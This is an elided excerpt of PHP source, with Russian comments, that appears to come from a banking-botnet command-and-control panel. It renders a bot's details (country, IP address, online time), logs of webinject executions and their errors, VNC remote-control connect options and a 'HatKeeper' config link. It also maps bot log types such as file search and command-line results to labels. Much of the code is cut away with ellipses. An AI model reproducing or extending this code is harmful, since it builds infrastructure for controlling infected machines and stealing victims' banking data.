...
$mainMenu = array(      //Модуль.             //Название.               //Необходимые права (,=and, |=or).
                ...
                array('/reports_neurostat', '',                       array('r_reports_db')),
				...
				array('/reports_hatkeeper', '',                       array('r_reports_db')),
...
HTML;
      ...
      else
      {
        ...
        str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['flags'])),                                                                   THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
        ...
        THEME_LIST_ROW_BEGIN.
          ...
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['country'])),                                                                THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.         
        THEME_LIST_ROW_BEGIN.
          str_replace(array('{WIDTH}', '{TEXT}'), array('1%',   LNG_BA_FULLINFO_IPV4),                                                                          THEME_LIST_ITEM_LTEXT_U1).
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ipv4),                                                                                         THEME_LIST_ITEM_LTEXT_U1).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
        ...
        THEME_LIST_ROW_BEGIN.
          ...
          str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['is_online'] == 1 ? tickCountToText(CURRENT_TIME - $l['rtime_online']) : LNG_FORMAT_NOTIME), THEME_LIST_ITEM_LTEXT_U2).
        THEME_LIST_ROW_END.
        THEME_LIST_ROW_BEGIN.
		...
		$data .= '<tr><td colspan=2>' . vncplugin_draw_connect_options($bot) . '</td></tr>';
          ...
          if (file_exists('system/botnet_webinjects.php')){
              ...
              $data .= '<th>'.LNG_BA_FULLINFO_WEBINJECTS_TH_ERRORS.'</th>';
              $data .= '</tr></THEAD>';
              $data .= '<TBODY>';
              while ($log = $q_execs->fetchObject()){
                  $data .=  '<tr>';
                  $data .=  '<th>'.$log->b_name.'</th>';
                  $data .=  '<td>'.(is_null($log->etime)? LNG_BA_FULLINFO_WEBINJECTS_PENDING : timeago(time() - $log->etime)).'</td>';
                  $data .=  '<td>'.htmlentities(nl2br($log->exec_error.' '.$log->debug_error)).'</td>';
                  $data .=  '</tr>';
              }
              $data .=  '</TBODY>';
              $data .=  '</table>';
...
function bltToLng($type) 
{
  switch($type)
  {
    ...
    case BLT_FILE_SEARCH:           return LNG_BLT_FILE_SEARCH;
    ...
    case BLT_COMMANDLINE_RESULT:    return LNG_BLT_COMMANDLINE_RESULT;
    case BLT_DEBUG:                 return 'DEBUG';
  }
  return LNG_BLT_UNKNOWN.' (type='.$type.')';
}
...
function vncplugin_draw_connect_options($botId){
    ...
    if (file_exists('system/reports_hatkeeper.php')){
        $data .= '<div id="hatkeeper-xml-config" style="clear:both; font-size: 16pt; display: none;">'
                .'<a href="'.authTokenURL('reports_hatkeeper/xml').'&botId='.rawurlencode($botId).'" target="_blank">HatKeeper XML Config</a>'
                .'</div>';
    }
